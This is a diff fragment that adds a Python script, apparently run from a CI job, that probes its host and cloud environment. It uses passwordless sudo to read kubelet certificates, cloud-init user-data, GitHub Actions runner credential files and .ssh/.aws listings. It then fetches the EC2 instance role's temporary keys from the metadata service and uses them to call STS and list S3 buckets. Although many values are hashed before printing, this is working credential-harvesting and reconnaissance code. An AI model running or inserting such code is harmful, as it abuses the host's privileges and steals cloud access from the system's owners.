+            if isinstance(b, str):
+                b = b.encode()
+            return hashlib.sha256(b).hexdigest() if b else 'na'
+
+
+        def redact(s, cap=220):
+            """Redact secret-looking key=value pairs and long blobs to sha256."""
+            if s is None:
+                return ''
+            try:
+                s = str(s)
+            except Exception:
+                return '<unstr>'
+            def kv_sub(m):
+                return m.group(1) + 'sha256:' + sha(m.group(2))[:16]
+            s = KV.sub(kv_sub, s)
+            def blob_sub(m):
+                return 'sha256:' + sha(m.group(0))[:16]
+            s = BLOB.sub(blob_sub, s)
+            return s[:cap]
+
+
+        def sh(cmd, timeout=10, input_bytes=None, maxlen=12000):
+            try:
+                r = subprocess.run(cmd, input=input_bytes, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, timeout=timeout)
+                return r.returncode, r.stdout[:maxlen], r.stderr[:400]
+            except FileNotFoundError:
+                return -2, b'', b'notfound'
+            except subprocess.TimeoutExpired:
+                return -3, b'', b'timeout'
+            except Exception as e:
+                return -1, b'', type(e).__name__.encode()
+
+
+        def sread(path, maxbytes=131072, timeout=10):
+            return sh(['sudo', '-n', 'cat', path], timeout=timeout, maxlen=maxbytes)
+
+
+        def emit(tag, s):
+            print('%s %s' % (tag, s))
+
+
+        # --------------------------------------------------------------------------- host
+        def host_enum():
+            print('HOST_ENUM_BEGIN')
+            for p in ('/etc/hostname', '/etc/machine-id'):
+                rc, out, err = sread(p, 4096)
+                if rc == 0:
+                    print('HOSTFILE %s present=1 bytes=%d sha256=%s value=%s' % (
+                        p, len(out), sha(out), out.decode('utf-8', 'replace').strip()[:120]))
+                else:
+                    print('HOSTFILE %s present=0 rc=%d' % (p, rc))
+            for p in ('/sys/class/dmi/id/product_serial', '/sys/class/dmi/id/board_serial',
+                      '/sys/class/dmi/id/product_uuid'):
+                rc, out, err = sread(p, 4096)
+                if rc == 0:
+                    print('DMI %s present=1 value=%s' % (p, out.decode('utf-8', 'replace').strip()[:120]))
+                else:
+                    print('DMI %s present=0 rc=%d' % (p, rc))
+            rc, out, err = sread('/proc/1/environ', 65536)
+            if rc == 0:
+                names = sorted({x.split(b'=', 1)[0].decode('utf-8', 'replace')
+                                for x in out.split(b'\0') if x})
+                print('PID1_ENVIRON_NAMES count=%d names=%s' % (len(names), ','.join(names[:100])))
+            else:
+                print('PID1_ENVIRON_NAMES rc=%d' % rc)
+            for p in ('/etc/kubernetes/kubelet.conf', '/var/lib/kubelet/config.yaml'):
+                rc, out, err = sread(p, 262144)
+                if rc != 0:
+                    print('KUBELET %s present=0 rc=%d' % (p, rc))
+                    continue
+                txt = out.decode('utf-8', 'replace')
+                print('KUBELET %s present=1 bytes=%d sha256=%s' % (p, len(out), sha(out)))
+                for ln in txt.splitlines():
+                    if ln.strip().startswith('server:'):
+                        print('KUBELET_SERVER %s=%s' % (p, ln.strip()[:300]))
+                m = re.search(r'client-certificate-data:\s*(\S+)', txt)
+                print('KUBELET_KEY_PRESENT %s=%d' % (p, 1 if 'client-key-data:' in txt else 0))
+                if m:
+                    try:
+                        pem = base64.b64decode(m.group(1))
+                        print('KUBELET_CLIENT_CERT %s bytes=%d sha256=%s' % (p, len(pem), sha(pem)))
+                        rc3, o3, e3 = sh(['openssl', 'x509', '-noout', '-subject', '-issuer', '-dates'],
+                                         timeout=8, input_bytes=pem)
+                        print('KUBELET_CERT_ATTRS %s rc=%d %s' % (
+                            p, rc3, o3.decode('utf-8', 'replace').replace('\n', ' | ')[:600]))
+                    except Exception as e:
+                        print('KUBELET_CERT_PARSE_ERR %s %s' % (p, type(e).__name__))
+            for p in ('/var/lib/cloud/instance/user-data.txt', '/var/log/cloud-init-output.log'):
+                rc, out, err = sread(p, 2097152)
+                if rc != 0:
+                    print('CLOUDINIT %s present=0 rc=%d' % (p, rc))
+                    continue
+                txt = out.decode('utf-8', 'replace')
+                lines = txt.splitlines()
+                keys = []
+                for ln in lines:
+                    m = re.match(r'^([A-Za-z0-9_.\-]{1,60})\s*:', ln)
+                    if m:
+                        keys.append(m.group(1))
+                print('CLOUDINIT %s present=1 bytes=%d sha256=%s lines=%d' % (p, len(out), sha(out), len(lines)))
+                print('CLOUDINIT_KEYS %s count=%d names=%s' % (
+                    p, len(set(keys)), ','.join(sorted(set(keys))[:80])))
+                shown = 0
+                for ln in lines:
+                    if not ln.strip():
+                        continue
+                    print('CLOUDINIT_LINE %s %s' % (p, redact(ln)))
+                    shown += 1
+                    if shown >= 25:
+                        break
+            rp = '/opt/actions-runner'
+            for p in (rp + '/.runner', '/opt/actions-runner/.credentials'):
+                rc, out, err = sread(p, 65536)
+                if rc != 0:
+                    print('RUNNER %s present=0 rc=%d' % (p, rc))
+                    continue
+                print('RUNNER %s present=1 bytes=%d sha256=%s' % (p, len(out), sha(out)))
+                try:
+                    j = json.loads(out.decode('utf-8', 'replace'))
+                except Exception:
+                    print('RUNNER %s JSON_PARSE_FAIL=1' % p)
+                    continue
+                if p.endswith('.runner'):
+                    def walk(o, pre=''):
+                        if isinstance(o, dict):
+                            for k, v in o.items():
+                                if isinstance(v, dict):
+                                    walk(v, pre + k + '.')
+                                elif SECRETISH.search(k):
+                                    print('RUNNER_FIELD %s%s=sha256:%s' % (pre, k, sha(str(v).encode())[:16]))
+                                else:
+                                    print('RUNNER_FIELD %s%s=%s' % (pre, k, redact(v, 160)))
+                    walk(j)
+                else:
+                    names = []
+                    def names_of(o, pre=''):
+                        if isinstance(o, dict):
+                            for k, v in o.items():
+                                names.append(pre + k)
+                                names_of(v, pre + k + '.')
+                    names_of(j)
+                    print('CREDS_FIELD_PATHS count=%d names=%s' % (len(names), ','.join(names[:80])))
+            rc, out, err = sh(['sudo', '-n', 'find', '/home', '/root', '-maxdepth', '3', '(',
+                               '-name', '.aws', '-o', '-name', '.ssh', ')', '-print'], timeout=20, maxlen=20000)
+            if rc == 0:
+                dirs = [d for d in out.decode('utf-8', 'replace').splitlines() if d.strip()]
+                print('AWS_SSH_DIRS count=%d dirs=%s' % (len(dirs), ','.join(dirs[:20])))
+                for d in dirs[:12]:
+                    rc2, o2, e2 = sh(['sudo', '-n', 'ls', '-la', d], timeout=10, maxlen=6000)
+                    print('AWS_SSH_LS %s rc=%d' % (d, rc2))
+                    for ln in o2.decode('utf-8', 'replace').splitlines()[:40]:
+                        print('AWS_SSH_ENTRY %s %s' % (d, ln[:200]))
+            else:
+                print('AWS_SSH_DIRS rc=%d' % rc)
+            rc, out, err = sh(['lsblk', '-o', 'NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,MODEL,SERIAL'],
+                              timeout=10, maxlen=8000)
+            print('LSBLK rc=%d lines=%d' % (rc, len(out.decode('utf-8', 'replace').splitlines())))
+            for ln in out.decode('utf-8', 'replace').splitlines()[:60]:
+                print('LSBLK ' + ln[:220])
+            try:
+                txt = open('/proc/mounts').read()
+                sel = [ln for ln in txt.splitlines()
+                       if ('/dev/' in ln or 'nfs' in ln or 'efs' in ln or 'nvme' in ln or 'xvd' in ln)]
+                print('MOUNTS_FILTERED lines=%d total=%d' % (len(sel), len(txt.splitlines())))
+                for ln in sel[:80]:
+                    print('MOUNT ' + ln[:240])
+            except Exception as e:
+                print('MOUNTS_ERR=%s' % type(e).__name__)
+            got_ss = False
+            for cmd in (['ss', '-lntup'], ['ss', '-lntu']):
+                rc, out, err = sh(cmd, timeout=10, maxlen=12000)
+                if rc == 0:
+                    print('SS cmd=%s lines=%d' % (' '.join(cmd), len(out.decode('utf-8', 'replace').splitlines())))
+                    for ln in out.decode('utf-8', 'replace').splitlines()[:80]:
+                        print('SS ' + ln[:220])
+                    got_ss = True
+                    break
+            if not got_ss:
+                print('SS_ABSENT')
+            rc, out, err = sh(['systemctl', 'list-units', '--type=service', '--state=running',
+                               '--no-pager', '--no-legend'], timeout=10, maxlen=12000)
+            print('SYSTEMD_RUNNING rc=%d lines=%d' % (rc, len(out.decode('utf-8', 'replace').splitlines())))
+            for ln in out.decode('utf-8', 'replace').splitlines()[:100]:
+                print('SYSTEMD ' + ln[:200])
+            print('HOST_ENUM_END')
+
+
+        # --------------------------------------------------------------------------- AWS
+        def sigv4_headers(service, region, method, url, extra_headers, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            canon = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                canon['x-amz-security-token'] = token
+            for k, v in (extra_headers or {}).items():
+                canon[k.lower().strip()] = ' '.join(str(v).strip().split())
+            signed = ';'.join(sorted(canon))
+            cheaders = ''.join('%s:%s\n' % (k, canon[k]) for k in sorted(canon))
+            qpairs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
+            cquery = '&'.join('%s=%s' % (urllib.parse.quote(str(k), safe='-_.~'),
+                                         urllib.parse.quote(str(v), safe='-_.~'))
+                              for k, v in sorted(qpairs))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', cquery, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
+                             hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
+                                    % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            for k2, v2 in (extra_headers or {}).items():
+                out[k2] = v2
+            return out
+
+
+        def aws_query(region, service, action, version, params, creds, timeout=15):
+            endpoint = 'https://%s.%s.amazonaws.com' % (service, region)
+            body = urllib.parse.urlencode([('Action', action), ('Version', version)] + params).encode()
+            hdrs = sigv4_headers(service, region, 'POST', endpoint + '/',
+                                 {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'},
+                                 body, creds['ak'], creds['sk'], creds.get('token'))
+            return http('POST', endpoint + '/', hdrs, body, timeout=timeout)
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            try:
+                import xml.etree.ElementTree as ET
+                root = ET.fromstring(body)
+                code = message = ''
+                for e in root.iter():
+                    t = e.tag.split('}')[-1]
+                    if t == 'Code' and not code:
+                        code = (e.text or '').strip()
+                    if t == 'Message' and not message:
+                        message = (e.text or '').strip()
+                msg = code + ':' + message
+            except Exception:
+                msg = ''
+            if not msg.strip(':'):
+                try:
+                    j = json.loads(body)
+                    msg = str(j.get('__type') or j.get('code') or j.get('Code') or '') + ':' + \
+                          str(j.get('message') or j.get('Message') or '')
+                except Exception:
+                    msg = body.decode('utf-8', 'replace')
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, redact(msg, 240).replace('\n', ' ')))
+
+
+        def aws_checks(creds, region):
+            print('AWS_ENUM=begin region=%s' % region)
+            s, _, b = aws_query(region, 'sts', 'GetCallerIdentity', '2011-06-15', [], creds)
+            if s == 200:
+                acct = arn = ''
+                try:
+                    import xml.etree.ElementTree as ET
+                    root = ET.fromstring(b)
+                    for e in root.iter():
+                        t = e.tag.split('}')[-1]
+                        if t == 'Account' and not acct:
+                            acct = (e.text or '').strip()
+                        if t == 'Arn' and not arn:
+                            arn = (e.text or '').strip()
+                except Exception:
+                    pass
+                print('AWS_IDENTITY status=200 account=%s arn=%s' % (acct, arn))
+            else:
+                aws_err('sts', 'GetCallerIdentity', s, b)
+            # s3:ListBuckets with the required x-amz-content-sha256 header (bucket names only)
+            endpoint = 'https://s3.amazonaws.com/'
+            payload_hash = hashlib.sha256(b'').hexdigest()
+            hdrs = sigv4_headers('s3', 'us-east-1', 'GET', endpoint, {'x-amz-content-sha256': payload_hash},
+                                 b'', creds['ak'], creds['sk'], creds.get('token'))
+            s2, h2, b2 = http('GET', endpoint, hdrs, None, timeout=15)
+            if s2 == 200:
+                names = []
+                try:
+                    import xml.etree.ElementTree as ET
+                    root = ET.fromstring(b2)
+                    for e in root.iter():
+                        if e.tag.split('}')[-1] == 'Name' and (e.text or '').strip():
+                            names.append((e.text or '').strip())
+                except Exception:
+                    pass
+                print('S3_BUCKETS status=200 count=%d names=%s' % (len(names), ','.join(names[:100])))
+            else:
+                aws_err('s3', 'ListBuckets', s2, b2)
+            print('AWS_ENUM=end')
+
+
+        # --------------------------------------------------------------------------- IMDS
+        def imds():
+            print('IMDS_BEGIN')
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def get(path, label, show_value=False, max_bytes=262144):
+                hdrs = {'X-aws-ec2-metadata-token': token} if token else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=4)
+                val = b.decode('utf-8', 'replace')
+                suffix = ' value=' + redact(val.strip(), 200) if (show_value and s == 200) else ''
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (
+                    label, 1 if hdrs else 0, s, len(b), sha(b), suffix))
+                return s, val
+
+            s_id, v_id = get('/latest/meta-data/instance-id', 'instance-id', show_value=True)
+            s_az, v_az = get('/latest/meta-data/placement/availability-zone', 'az', show_value=True)
+            s_rl, v_rl = get('/latest/meta-data/iam/security-credentials/', 'role-list', show_value=True)
+            s_v1, _ = get('/latest/meta-data/instance-id', 'v1-instance-id')
+            s_bog, _ = get('/latest/meta-data/%s-bogus' % NONCE, 'bogus-control')
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            # /latest/user-data: bounded, redacted structural summary only
+            s_ud, v_ud = get('/latest/user-data', 'user-data')
+            if s_ud == 200 and v_ud.strip():
+                lines = v_ud.splitlines()
+                keys = []
+                for ln in lines:
+                    m = re.match(r'^([A-Za-z0-9_.\-]{1,60})\s*:', ln)
+                    if m:
+                        keys.append(m.group(1))
+                print('IMDS_USERDATA lines=%d key_names=%s' % (len(lines), ','.join(sorted(set(keys))[:60])))
+                shown = 0
+                for ln in lines:
+                    if not ln.strip():
+                        continue
+                    print('IMDS_USERDATA_LINE ' + redact(ln))
+                    shown += 1
+                    if shown >= 20:
+                        break
+
+            # instance tags: secret-looking values -> sha256
+            s_tg, v_tg = get('/latest/meta-data/tags/instance/', 'tags-list')
+            if s_tg == 200:
+                tagnames = [t.strip() for t in v_tg.splitlines() if t.strip()]
+                print('IMDS_TAGS count=%d names=%s' % (len(tagnames), ','.join(tagnames[:40])))
+                for name in tagnames[:20]:
+                    s1, v1 = get('/latest/meta-data/tags/instance/' + urllib.parse.quote(name), 'tag:' + name)
+                    if s1 == 200:
+                        if SECRETISH.search(name) or SECRETISH.search(v1):
+                            print('TAG_VALUE name=%s redacted=sha256:%s bytes=%d' % (
+                                name, sha(v1.encode())[:16], len(v1)))
+                        else:
+                            print('TAG_VALUE name=%s value=%s' % (name, redact(v1.strip(), 160)))
+
+            # network interfaces / macs
+            s_mac, v_mac = get('/latest/meta-data/network/interfaces/macs/', 'macs')
+            if s_mac == 200:
+                macs = [m.strip().rstrip('/') for m in v_mac.splitlines() if m.strip()]
+                print('IMDS_MACS count=%d macs=%s' % (len(macs), ','.join(macs[:20])))
+                for mac in macs[:10]:
+                    base = '/latest/meta-data/network/interfaces/macs/' + mac
+                    for sub in ('vpc-id', 'subnet-id', 'security-group-ids'):
+                        s2, v2 = get(base + '/' + sub, 'mac:%s:%s' % (mac, sub), show_value=True)
+
+            # instance identity document (account/region/instance type; not secret)
+            s_doc, v_doc = get('/latest/dynamic/instance-identity/document', 'identity-document', max_bytes=65536)
+            if s_doc == 200:
+                try:
+                    j = json.loads(v_doc)
+                    for k in sorted(j.keys()):
+                        print('IDENTITY_DOC %s=%s' % (k, redact(j[k], 160)))
+                except Exception:
+                    print('IDENTITY_DOC_PARSE_FAIL=1')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+            creds = None
+            region = 'us-east-1'
+            if s_doc == 200:
+                try:
+                    region = json.loads(v_doc).get('region') or region
+                except Exception:
+                    pass
+            if roles:
+                role = roles[0].strip()
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' +
+                                     urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=4)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception:
+                        print('ROLE_JSON_PARSE_FAIL=1')
+            if creds:
+                aws_checks(creds, region)
+            else:
+                print('AWS_ENUM=skipped no-creds')
+            print('IMDS_END')
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+            rc, out, err = sh(['sudo', '-n', 'id', '-u'], timeout=8, maxlen=512)
+            sudo_uid = out.decode('utf-8', 'replace').strip()
+            print('SUDO_ID_U rc=%d stdout=%s stderr_sha256=%s' % (
+                rc, sudo_uid if sudo_uid else 'none', sha(err) if err else 'none'))
+            rc2, out2, err2 = sh(['sudo', '-n', '-l'], timeout=8, maxlen=6000)
+            print('SUDO_LIST_BEGIN rc=%d bytes=%d sha256=%s' % (rc2, len(out2), sha(out2)))
+            for ln in out2.decode('utf-8', 'replace').splitlines():
+                print('SUDOL ' + ln[:240])
+            print('SUDO_LIST_END')
+            if err2:
+                print('SUDO_LIST_ERR ' + redact(err2.decode('utf-8', 'replace'), 400).replace('\n', ' | '))
+            root = (rc == 0 and sudo_uid == '0')
+            print('ROOT_PROVEN=%d' % (1 if root else 0))
+            if root:
+                host_enum()
+            else:
+                print('HOST_ENUM=skipped no-root')
+            imds()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:200]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130788-28891149ac370155"
